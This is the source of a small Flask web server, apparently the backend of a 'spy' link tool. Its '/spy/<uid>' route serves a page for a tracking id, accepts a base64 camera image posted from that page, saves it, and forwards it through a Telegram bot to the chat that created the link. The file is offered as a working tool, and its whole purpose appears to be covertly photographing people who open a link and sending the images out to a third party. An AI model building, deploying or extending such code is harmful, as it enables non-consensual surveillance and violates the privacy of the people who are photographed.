from flask import Flask, render_template, request
import base64, os, json, requests

app = Flask(__name__)
DATA_FILE = "db.json"
MEDIA_DIR = "media"
BOT_TOKEN = "YOUR_BOT_TOKEN"
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"

@app.route('/spy/<uid>', methods=['GET', 'POST'])
def spy(uid):
    if request.method == 'POST':
        img_data = request.form.get('image')
        if not img_data:
            return 'No image received', 400
        img_data = img_data.replace("data:image/jpeg;base64,", "")
        filename = f"{uid}.jpg"
        filepath = os.path.join(MEDIA_DIR, filename)
        with open(filepath, "wb") as f:
            f.write(base64.b64decode(img_data))

        try:
            with open(DATA_FILE, "r") as f:
                data = json.load(f)
            for user_id, items in data.items():
                if uid in items:
                    requests.post(TELEGRAM_API, data={
                        "chat_id": user_id,
                    }, files={"photo": open(filepath, "rb")})
                    break
        except Exception as e:
            print("Gagal kirim ke Telegram:", e)

        return 'OK', 200
    return render_template("index.html", uid=uid)

if __name__ == "__main__":
    if not os.path.exists(MEDIA_DIR):
        os.makedirs(MEDIA_DIR)
    app.run(host="0.0.0.0", port=5000)
